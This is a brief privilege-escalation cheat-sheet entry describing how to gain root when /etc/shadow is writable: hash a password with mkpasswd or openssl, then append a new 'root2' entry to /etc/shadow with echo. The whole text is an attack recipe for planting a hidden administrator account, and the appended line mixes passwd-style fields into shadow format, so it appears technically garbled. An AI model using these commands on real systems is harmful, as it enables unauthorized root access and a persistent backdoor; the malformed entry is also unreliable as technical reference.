
We can change the password of the root user when it's writable.

First we'll have to generate an hashed password, we can use mkpasswd or openssl for this:

```
mkpasswd -m sha-512 <password>

openssl passwd <password>
```

After we can open the shadow file with nano, or if no editor is available, use the following command:

```
echo "root2:$6$ms0pmWQp$SZE7f8uuLZTUYnNmTmKL5Vuar3dzTkMCaByo6BK5p3pucCHVutpetLidq4A.yuJejM/V2OS/54bxLNBEEhgBG1:0:0:/root:/bin/bash::" >> /etc/shadow
```

